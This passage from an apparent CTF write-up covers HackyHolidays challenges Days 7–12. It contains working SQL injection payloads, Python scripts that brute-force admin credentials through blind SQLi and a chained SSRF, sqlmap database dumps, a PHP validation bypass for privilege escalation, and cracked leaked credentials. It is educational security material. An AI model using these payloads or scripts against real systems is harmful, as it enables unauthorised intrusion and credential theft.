preview_markup=Hello+{{name}}+....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

```html
Hello <html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4> ....
```

Flag captured! `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

# Day 8
> The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!

{F1134453}

The login page shows a generic "Username/Password Combination is invalid" which means we can't enumerate usernames like last time. The forum posts did show posts by a user named `grinch` and another named `max`. I tried to use a wordlist to find their passwords, but this seemed to be a dead end. 

To the fuzzmobile!

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/forum/FUZZ

1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

`1` and `2` are links to subforums you can see from navigating the site. `phpmyadmin` is interesting though! 

{F1134452}

There really didn't seem to be any more content on the site. Time to look for information off the site!

I used a [Google Dork](https://en.wikipedia.org/wiki/Google_hacking) to see if any of the source code was publicly:

{F1134451}

One result, and it is about `Grinch-Networks/forum`! Perfect!

I looked through the commit messages to see if any caught my attention. [small fix](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae) looked like a good place to start.

The diff had:
```php
    static public function read(){
        if( gettype(self::$read) == 'string' ) {
-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }
```

Cool, some database credentials. We can use this to get into phpMyAdmin.

{F1134455}

I used https://crackstation.net/ to crack the hash of the `grinch` admin user. The saved value is an MD5 hash of the string `BahHumbug`. Now we can log into the main forum with the grinch credentials to see hidden posts.

{F1134454}

`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

## Takeaways
- Commit histories can contain sensitive data.
- Salt your fries and your passwords! Unsalted passwords are far easier to crack.

# Day 9
> Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!

What's in store this time?

{F1134460}

There's a big button to access the Admin area, but it requires a username and password. The main focus though is the quiz, where you can enter your name and then step through the pages.

{F1134461}
{F1134462}

When hunting for vulnerabilities, it's good to start by seeing how your input is able to change your target's output. I noticed right away the unusual stat of "There is X other player(s) with the same name as you!". I thought a bit about how that might be implemented on the server. Probably something like:

```python
query = "SELECT count(*) FROM users WHERE name = '" + userInput + "'"
```

If the server isn't sanitizing the input properly, it could be vulnerable to a SQL injection attack. To test this, I crafted a simple payload, setting the name to `' OR 1=1-- `. If we are lucky, the server will process the request like:

```sql
SELECT count(*) FROM users WHERE name = '' OR 1=1-- '
```

This would return the count of all records where either their name is `''` or it is true that `1=1`. Since 1 always equals itself, this would return all records. After clicking through the quiz page to get to the score, I got the result:

```
' OR 1=1-- You Scored
0/3
You're not evil at all!
There is 187882 other player(s) with the same name as you!
```

Awesome! This confirms the vulnerability. This is a "blind" SQL injection because we can't see the database data directly, but we can infer information based on how the page returns. From here I tried to extract a little information:

## How Many Columns Are In The Current Table?
This information is useful to know for when we run `union` queries later. I ran through the quiz using the following names
```
test' ORDER BY 1-- # Returned 143 users with the same name
test' ORDER BY 2-- # Returned 143 users with the same name
test' ORDER BY 3-- # Returned 143 users with the same name
test' ORDER BY 4-- # Returned 143 users with the same name
test' ORDER BY 5-- # Returned 0 users with the same name
```

This means that we have 4 columns in the current table. Ordering by a nonexistent column is not valid.

## What Is The User Table Named?
I had assumed it was named `users`, but doing a sanity test suggested otherwise:
```
test' UNION SELECT 1,2,3,4 FROM users-- # Returned 0 users
```

Other common names like `user`, `accounts`, `account` were not working either. MySQL has a special database `information_schema.tables` which stores information about the other tables in the database. We can use the injection vulnerability to read this information character by character. My idea was to use names like the following:

```
testerbtgsg54g45' union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary '<char>%'-- 
```

To explain, the first part of the query is a nonsense name that doesn't exist. We then do a UNION to select a table_name from the information schema. Note that we select 4 values in order to match the 4 columns of the table that is currently being searched. The last part is where we could put a letter and then a wildcard. Then we know that whichever letter returned "1 other player(s) with the same name as you!" would be the letter a table starts with. And we could go character by character. 

## Exfiltrating the Data

From here I wrote a script to find the table name and the username and password of the admin:

```python
#!/usr/bin/env python3

import requests
import re
import sys

ENDPOINT = 'https://hackyholidays.h1ctf.com/evil-quiz/'
LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'
ALL_CHARS = LOWERCASE + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' + '-$_'
table_name_exploit = "union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary "
username_exploit = "union select 1, 2, 3, 4 from admin where username like binary "
password_exploit = "union select 1, 2, 3, 4 from admin where password like binary "
cookie = ''

def process(exploit, charset=LOWERCASE):
    accumulator = ''
    while True:
        for char in charset:
            if run_exploit(exploit + f"'{accumulator}{char}%'"):
                accumulator += char
                break
        print(f"Result: '{accumulator}%'")

def run_exploit(exploit):
    payload = build_payload(exploit)
    name = requests.post(ENDPOINT, cookies=cookie, data = {'name': payload})
    start = requests.post(ENDPOINT + 'start', cookies=cookie, data = {'ques_1': 0, 'ques_2': 0, 'ques_3': 0})
    score = requests.get(ENDPOINT + 'score', cookies=cookie)
    
    success = int(re.search("There is ([0-9]+) other player\(s\) with the same name as you!", str(score.content)).groups()[0]) > 0
    return success

def build_payload(exploit):
    return "testerbtgsg54g45' " + exploit + "-- "

r = requests.get(ENDPOINT)
cookie = { 'session': r.cookies['session'] }

sys.argv[1] == 'TABLE_NAME' and process(table_name_exploit) # admin
sys.argv[1] == 'USERNAME' and process(username_exploit)
sys.argv[1] == 'PASSWORD' and process(password_exploit, charset=ALL_CHARS)

```

Running the thing:
```sh
$ ./script.py TABLE_NAME
Result: 'a%'
Result: 'ad%'
Result: 'adm%'
Result: 'admi%'
Result: 'admin%'
```

I put this table name into the username and password exploit strings. From here I could pull the login:
```
$ ./script.py USERNAME  
Result: 'a%'
Result: 'ad%'
Result: 'adm%'
Result: 'admi%'
Result: 'admin%'

./script.py PASSWORD
Result: 'S3creT_%'
Result: 'S3creT_p%'
Result: 'S3creT_p4%'
Result: 'S3creT_p4s%'
Result: 'S3creT_p4ss%'
Result: 'S3creT_p4ssw%'
Result: 'S3creT_p4ssw0%'
Result: 'S3creT_p4ssw0r%'
Result: 'S3creT_p4ssw0rd%'
Result: 'S3creT_p4ssw0rd-%'
Result: 'S3creT_p4ssw0rd-$%'
```

Logging in with the `admin/S3creT_p4ssw0rd-$` credentials gives the flag:

`flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

# Day 10

> You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!

{F1134463}

We don't have credentials to log in. Registering a new account takes us to a user page:

{F1134464}

Sometimes when inspecting the HTML of webpages you can find some hidden information. Looks like Grinch forgot to delete a comment in the framework he was using on the main page:

```html
<!-- See README.md for assistance -->
```

Well if Grinch can see `README.md`, why shouldn't we? Downloading `/signup-manager/README.md` we get:

```md
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

There's a bunch of information we can gather here. The default login was just a bait, but `/signup-manager/signupmanager.zip` can be downloaded! Unzipping the file we gain access to the source PHP files. Most importantly, `index.php`, which shows how our users are being saved. Let's look at a few key areas of the file:

## index.php - Input Validation

```php
$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
if (strlen($username) < 3) {
    $errors[] = 'Username must by at least 3 characters';
} else {
    if (isset($all_users[$username])) {
        $errors[] = 'Username already exists';
    }
}
$password = md5($_POST["password"]);
$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
if (strlen($firstname) < 3) {
    $errors[] = 'First name must by at least 3 characters';
}
$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
if (strlen($lastname) < 3) {
    $errors[] = 'Last name must by at least 3 characters';
}
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
if (count($errors) === 0) {
    $cookie = addUser($username, $password, $age, $firstname, $lastname);
    setcookie('token', $cookie, time() + 3600);
    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
    exit();
}
```

1. For the `username`, `firstname`, and `lastname`, the server deletes any character that isn't a number or letter, and then truncates to the first 15 characters.
1. For the `password`, the server saves the MD5 hash of the input. (Note for later that MD5 hashes have a length of 32 characters).
1. If the `age` passes the `is_numeric` check, and has a string length under 3, the integer value gets saved.

## index.php - Saving a New User
```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```
Once the inputs have been validated, they get saved to `users.txt` here as one line per user. The variables in the line get padded to specific lengths. The README file mentioned that if the last character is "Y" you are an admin. We can assume this `'N'` that is hardcoded makes us a non admin.

An example line in `users.txt` could look like: `hello##########7d793037a0760186574b0282f2f435e7ce9e931b3203a7f3723b512b7f0801d610#first##########last###########N`

## index.php - Fetching Users From The ~~Database~~ users.txt
```php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
```

When you navigate to the page logged in, your user information gets plucked from `users.txt` via this method. We can see that the server expects everything to be defined nicely at the proper index offsets in the line. The padding characters get stripped, and very interestingly, index 112 determines whether or not the user was an admin. If we can get a `Y` to appear here, the system will think we are an admin.

## Making the Exploit
The validation is set in a way that even if we use the maximum number of characters for every field, and make all the letter characters Ys, we still won't be writing to the index that determines if we are an admin. I ran the code locally to test this:

```php
$maximum_y = str_repeat('Y', 15);
$user_str = addUser($maximum_y, md5('this will always be 32 characters'), "999", $maximum_y, $maximum_y);
echo $user_str . PHP_EOL;
echo 'Admin: ' . substr($user_str, 112, 1);
```
Output:
```
YYYYYYYYYYYYYYY9328d34dc87490369be5eec81dd91850b789dbf9d91f073744ed55c765825ead999YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYN
Admin: N
```

We need a way to trick the validation into letting us save just one extra chracter in our input to push the N away, and let us use our Y instead.

The age processing in the validation stood out to me because the data that gets saved isn't exactly the same as the data that gets validated. Pasting it again here:

```php
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
```
`$_POST["age"]` has our age as a string. `is_numeric` checks that it can be interpreted as an integer. We then check it's string length, and then save it _as an integer_. I looked at the [documentation of is_numeric](https://www.php.net/manual/en/function.is-numeric), and saw that it accepts a bunch of formats as numeric, such as binary, hexadecimal, or scientific notation. Running a few tests I found out that I could set my age to `1e3`. This value passes the `is_numeric` check, has a string length of 3 which passes, but saves as it's integer value, `1000`. This will give us the one character we need to push the pesky `N` away.

## Running the Exploit


**Request:**
```
POST /signup-manager/
action=signup&username=q38&password=123&age=1e3&firstname=123&lastname=aaaaaaaaaaaaaaY
```

```
HTTP/1.1 302 Found
Set-Cookie: token=870fa22f8c9727d9e1b527499bb55457; expires=Mon, 21-Dec-2020 17:40:35 GMT; Max-Age=3600
Location: /signup-manager/
```

**Request:**
```
GET /signup-manager/ HTTP/1.1
Cookie: token=870fa22f8c9727d9e1b527499bb55457
```

```html
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center" style="margin:0;padding:0">Admin Area</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3" style="margin-top:15px">
            <div class="alert alert-info">
                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
                <p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

Got the flag, `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`, and the location of tomorrow's challenge `/r3c0n_server_4fdk59`.

# Day 11
We're getting into the depths of the Grinch's schemes now.

{F1134467}

The "Attack Box" button takes us to a login page. Presumably we gain the login details by completing this challenge.

## Exploring the Site

Each of the albums displays some Santa sightings:

{F1134465}

It is possible the `hash` parameter that is used to fetch the photos in that album is vulnerable to SQL injection. We could check manually like we did for day 9, but let's use [sqlmap](http://sqlmap.org/) this time around.

```
$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42'

GET parameter 'hash' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=3dir42' AND 2469=2469 AND 'eVQs'='eVQs

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-9115' UNION ALL SELECT NULL,NULL,CONCAT(0x7171767871,0x6652794752675962646d466752426364554549457a736577764752754f4c537877415a7363784e73,0x71627a7871)-- -
---
```

Nice, the parameter is vulnerable! We can exploit this further to dump all the database tables:

```
$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42' --threads=5 --dump

Database: recon
Table: photo
[6 entries]
+----------+------+--------------------------------------+
| album_id | id   | photo                                |
+----------+------+--------------------------------------+
| 1        | 1    | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 1        | 2    | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 2        | 3    | 32febb19572b12435a6a390c08e8d3da.jpg |
| 3        | 4    | db507bdb186d33a719eb045603020cec.jpg |
| 3        | 5    | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 3        | 6    | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----------+------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+------+--------+-----------+
| id   | hash   | name      |
+------+--------+-----------+
| 1    | 3dir42 | Xmas 2018 |
| 2    | 59grop | Xmas 2019 |
| 3    | jdh34k | Xmas 2020 |
+------+--------+-----------+
```

Hmm...the results don't have login info or anything particularly interesting. Still, we can make note of this vulnerability and keep looking for more issues.

## Fuzzing

Let's do a quick fuzzing check to see if there are some pages we can't view from clicking the UI:

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -fc 404 -mc all

uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
```

The `uploads` and `picture` endpoints get called from the album page. Let's view this `api` page though:

{F1134466}

I tried guessing api endpoints, but any text you put after `/api/` returns the same `401 {"error":"This endpoint cannot be visited from this IP address"}` result. 


## Examining the Album Images
I noticed the album images were loading in an unusual way. Let's look a little closer at the 2018 album page:

```
GET /r3c0n_server_4fdk59/album?hash=3dir42
```
```html
<div class="col-md-4">
    <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzBhMzgyYzYxNzdiMDQzODZlMWE0NWNlZWFhODEyZTRlLmpwZyIsImF1dGgiOiJlYzVhOTkyMGUxNzdjY2M4NDk3NDE0NmY5M2FlMDRiMCJ9">
</div>

<div class="col-md-4">
    <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9">
</div>
```
Decoding the two base64 strings we get these two results:

```js
{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
{"image":"r3c0n_server_4fdk59\/uploads\/1254314b8292b8f790862d63fa5dce8f.jpg","auth":"99c00d3eef70847ac4888ae85d0b4c7e"}
```

Trying to go to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/0a382c6177b04386e1a45ceeaa812e4e.jpg directly gives an "Image cannot be viewed directly" error. It is interesting to note that when the server gets a request to the `picture` endpoint it will query the `uploads` endpoint to find the photo it needs. By changing the url of the `image` to `r3c0n_server_4fdk59\/api\/FUZZ` we could get authenticated requests to figure out what is hiding in the internal api.

I did try to set up a manual request to see if I could get any kind of response from the API: `{"image":"r3c0n_server_4fdk59\/uploads\/1","auth":"bbf295d686bd2af346fcd80c5398de9a"}`. After converting it to base64, the request was `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEiLCJhdXRoIjoiYmJmMjk1ZDY4NmJkMmFmMzQ2ZmNkODBjNTM5OGRlOWEifQ==`. Unfortunately, this and any other custom request to `picture` returns an `invalid authentication hash` error. Looks like it won't be this easy, and we need to figure out a way around the authentication as well.

## We Need to Go Deeper
I was stuck here for a while. The CTF admin posted this hint:

{F1134469}

Pretty weird hint, but I was willing to take anything at this point. It's a screenshot from Inception, a movie about dreams within dreams. Looks like we need to do exploits within exploits.

We know from the sqlmap dump above that the authentication information is not saved to the database. The server may be calculating authentication hashes on the fly for each of the pictures that comes up as being part of the album. If we can tune our injection just right, we could be able to trick the server into thinking it got an image from the database, and it would generate an authentication hash for it.

Recall that we fetch album photos by querying `/r3c0n_server_4fdk59/album?hash=` with an album's hash. From here, the server is able to determine which photos to display. Since this parameter is vulnerable, we can run a special query on the information schema to view the currently executing query. (Since the album title is rendered on the result page we have an easy way to view the results of our injection.)

`GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+1,1,info+FROM+information_schema.processlist--+`
```html
<h1 class="text-center">select * from album where hash = 'fakehash' UNION SELECT 1,1,info from information_schema.processlist-- '</h1>
```

Ok. From this response, we know the base query the server is executing is `select * from album where hash = '{input}'`. Since the server then retrieves all the pictures in that album, there must be a query right after executing something like `select * from photo where album_id = '{id_from_album_query}'`.

We need to go deeper. If this followup query is also vulnerable to SQL injection, we could craft a specific picture to load. (And we could potentially get an authenticated Server Side Request Forgery (SSRF) by doing this.)

### 1. Recreating the Table
Since we know the database schema from our sqlmap dump, we can recreate it in [sqlfiddle](http://sqlfiddle.com/) to play with a local copy to work out the injection queries.

```sql
create table album(id int, hash varchar(255), name varchar(255));
create table photo(album_id int, id int, photo varchar(255));
```

### 2. Creating a Custom Album

Using the album hash `fakehash' UNION SELECT 1337, 'my_hash', 'my_album_name'-- ` on the Grinch site would generate the following query:

```sql
SELECT * FROM album WHERE hash = 'fakehash' UNION SELECT 1337, 'my_hash', 'my_album_name'-- ';
```

Which returns:

id | hash | name
--- | --- | ---
1337 | my_hash | my_album_name

And of course, querying the endpoint returns no photos since this album does not exist:

```
GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+1337,+'my_hash',+'my_album_name'--+
```
```html
<div class="col-md-8 col-md-offset-2">
    <h1 class="text-center">my_album_name</h1>
    <div class="row">

        
    </div>
</div>
```

### 3. Adding Photos to Albums
What's an album without some nice photos?

Using the payload `fakehash' 
UNION SELECT "1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ", 'my_hash', 'my_album_name'-- ` we generate this query:

```sql
SELECT * FROM album WHERE hash = 'fakehash' 
UNION SELECT "1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ", 'my_hash', 'my_album_name'-- ';
```

Returning this result:

id | hash | name
--- | --- | ---
1337' UNION SELECT 0, 0, 'my_photo.jpg'--  | my_hash | my_album_name

And then, when the followup image fetch query runs, it will execute:

```sql
SELECT * FROM photo WHERE album_id = '1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ';
```

Returning:

album_id | id | photo
--- | --- | ---
0  | 0 | my_photo.jpg

Running it:
```
GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+"1337'+UNION+SELECT+0,+0,+'my_photo.jpg'--+",+'my_hash',+'my_album_name'--+ 
```
```html
<div class="col-md-8 col-md-offset-2">
    <h1 class="text-center">my_album_name</h1>
    <div class="row">

            <div class="col-md-4">
                <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL215X3Bob3RvLmpwZyIsImF1dGgiOiJlODgyNzNkZDM0YmRkMmRlN2M2MGRkNjQ1MGVhZDg4ZiJ9">
            </div>
        
    </div>
</div>
```

Decoded from base64, the image is:
```js
{"image":"r3c0n_server_4fdk59\/uploads\/my_photo.jpg","auth":"e88273dd34bdd2de7c60dd6450ead88f"}
```

Naturally, the image doesn't load on the page since this photo doesn't exist. We do note that the authorization hash was calculated though!

### 4. SSRF Time
Now we have a way to get authenticated results. We know that the server is assuming our photo is in the `uploads` directory. We can instead have our photo be named `..\/api\/FUZZ` and fuzz for api endpoints. 

I wrote a quick program to try every endpoint in a common API endpoints wordlist:

```python
#!/usr/bin/env python3

import re
import base64
import requests
import sys
  
BASE_URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/'
PAYLOAD = "fakehash'+UNION+SELECT+\"1337'+UNION+SELECT+0,+0,+'..\/api\/FUZZ'--+\",+'my_hash',+'my_album_name'--+"
SECLISTS_DIR = '../../../../SecLists/Discovery/Web-Content/'

def fuzz(wordlist, avoid_code='404', prefix='', suffix=''):
    with open(SECLISTS_DIR + wordlist) as payloads:
        lines = [x.strip() for x in payloads]
        for i, line in enumerate(lines):
            process(PAYLOAD.replace('FUZZ', prefix + line + suffix), avoid_code)

def process(payload, avoid_code):
    album = requests.get(BASE_URL + 'album?hash=' + payload)
    picture_data = re.match(r".*picture\?data=(.*)\"", str(album.content)).groups()[0]

    api_call = requests.get(BASE_URL + 'picture?data=' + picture_data)

    if avoid_code not in str(api_call.content):
        print(str(base64.b64decode(picture_data)))
        print(str(api_call.content))
        return True
    return False
    
sys.argv[1] == 'endpoints' and fuzz('common-api-endpoints-mazen160.txt', avoid_code='404') # finds endpoints "ping" and "user"
sys.argv[1] == 'parameters' and fuzz('burp-parameter-names.txt', avoid_code='400', prefix='user?', suffix='=1') # finds parameters "username" and "password"
```

Most endpoints just 404, but the endpoints `user` and `ping` both return:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 20:49:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 29

Invalid content type detected
```

When you query a normal image, you get a `Content-Type` of `image/jpeg`. The header here shows that it is returning a text result and it is confused because it is an images api. This error is fine though, it shows us that even though we aren't able to see the output of this api, we know that it exists.

The last line of the program fuzzes to find the parameters of the user endpoint. Most of the wordlist returns a `400` status, but `username` and `password` both return a `204 No Content`. With some fiddling I could see that the username and password fields were search fields. Trying `username=%` would return the "Invalid content type detected" error, while trying `username=1` would return `204 No Content`. This tells us that we have a true or false response to know if a certain user is existing. Using this, we can exfiltrate the login in the same way we did for day 9. To do this, I added an extra function to the existing script:

```python
CHARS = "qwertyuiopasdfghjklzxcvbnm1234567890"

def exfiltrate(field):
    accumulator = ''
    while True:
        for char in CHARS:
            payload = PAYLOAD.replace('FUZZ', f'user?{field}={accumulator}{char}%')
            if process(payload, avoid_code='204'):
                accumulator += char 

sys.argv[1] == 'username' and exfiltrate('username')
sys.argv[1] == 'password' and exfiltrate('password')
```

Running: 
```sh
$ ./api_fuzz.py username
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=g%","auth":"e8b7a05ab04f3c1165c79d08d331169a"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=gr%","auth":"9628e7ff516491d7fef561b270e6bf96"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=gri%","auth":"b72688442a598cee8ddb8b3c012b0ec4"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grin%","auth":"52bce9f7f3f8d95abed4a447545656d8"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinc%","auth":"aecf8d3c5edd3986815fb8f8bc31982f"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinch%","auth":"6f86b86d2013ab5ab58abd4d77b44506"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grincha%","auth":"fb005d3fc853a5b48927e526be4c7daf"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchad%","auth":"2eac9d3c5e350d26c8d44cd7f4135fbd"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadm%","auth":"6d4771f64f64ed71f8782de9cad19a68"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadmi%","auth":"07c90be0a9c886d667407f0bceb85dc1"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadmin%","auth":"492e8c29c6b95c00bc37be3884596c86"}'

$ ./api_fuzz.py password
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s%","auth":"cce984225bf170447abaad0fa0453ce7"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4%","auth":"e1363f9484af0f5f74bb9d742b46e6dd"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4n%","auth":"aec35f51d4c9cd352748ddfc96f420a5"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt%","auth":"53e5891faf4d065a21a2cfa8ae929627"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4%","auth":"6baf718704fe9c42d165410e4e37471c"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4s%","auth":"0c4fedfb721842a56a05405307eff3eb"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4su%","auth":"728b47db8b71517e7d8bf0462fdf60bf"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4suc%","auth":"e7fb3d6a9c0adbd839ac69922a2cddfc"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4suck%","auth":"d06aa53fa99473d10e523cd1cd8b1697"}'
b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4sucks%","auth":"c1e451e64373509cd5f30e4899fdb2ce"}'
```

Ok! Using the exfiltrated login of `grinchadmin/s4nt4sucks` we can access the attack box!

{F1134470}

`flag{07a03135-9778-4dee-a83c-7ec330728e72}`

## Takeaways
- It can be possible to dump an entire database's contents when there is an endpoint vulnerable to SQLi
- Exploits can be chained to wreak more havoc
- If an endpoint replies differently depending on whether or not some data exists you can exfiltrate information about it

# Day 12
Home stretch! Currently we are logged into the attack server after completing yesterday's challenge.

I can see that the attack server is primed to knock Santa's servers offline. To beat this challenge, we will need to redirect the attack to the Grinch's server instead. For now though, let's launch an attack on Santa just to see what happens. Sorry, Santa! Clicking the first link gets us:

```sh
grinch@attackbox:~/tools$ ./ddos --load b3d6931a61c78cf4dd1d8e4e7ad98b2a.target
Setting Target Information
Getting Host Information for: 203.0.113.33
Spinning up botnet
Launching attack against: 203.0.113.33 / 203.0.113.33
Launching attack against: 203.0.113.33 / 203.0.113.33
ping 203.0.113.33
ping 203.0.113.33
64 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=18.1 ms
64 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=18.1 ms
64 bytes from 203.0.113.33: icmp_seq=2 ttl=118 time=22.9 ms
64 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=16.3 ms
